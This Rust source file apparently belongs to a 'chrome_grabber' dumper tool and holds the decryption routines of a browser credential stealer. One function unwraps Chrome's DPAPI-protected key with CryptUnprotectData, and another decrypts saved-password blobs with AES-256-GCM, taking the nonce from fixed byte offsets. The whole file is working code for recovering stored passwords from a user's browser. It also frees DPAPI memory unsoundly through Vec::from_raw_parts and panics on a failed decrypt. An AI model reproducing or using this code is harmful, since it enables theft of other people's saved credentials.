use std::ptr;

use aes_gcm::{
    aead::{generic_array::GenericArray, Aead}, Aes256Gcm, KeyInit
};
use crate::chrome_grabber::dumper::DumperError;

use winapi::um::errhandlingapi::GetLastError;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;

pub fn aes_gcm256(key_buf: &mut [u8], pwd_buf: &[u8]) -> String {
    let key = GenericArray::from_slice(key_buf);
    let cipher = Aes256Gcm::new(key);
    let nonce = GenericArray::from_slice(&pwd_buf[3..15]);
    let plaintext = cipher
        .decrypt(nonce, &pwd_buf[15..]).unwrap();
    String::from_utf8(plaintext).map_err(|_| DumperError::FromUtf8Error).unwrap().to_string()
}

pub fn crypt_unprotect_data(data_buf: &mut [u8]) -> Result<Vec<u8>, DumperError> {
    let buf_ptr = data_buf.as_mut_ptr();
    let buf_len = data_buf.len();
    let mut data_in = DATA_BLOB {
        cbData: buf_len as u32,
        pbData: buf_ptr,
    };
    let mut data_out = unsafe { std::mem::zeroed() };
    let unprotect_result = unsafe {
        CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out,
        )
    };
    if unprotect_result == 0 {
        let error = unsafe { GetLastError() };
        return Err(DumperError::DpapiFailedToDecrypt(error));
    }
    let size = data_out.cbData as usize;
    unsafe { Ok(Vec::from_raw_parts(data_out.pbData, size, size))}
}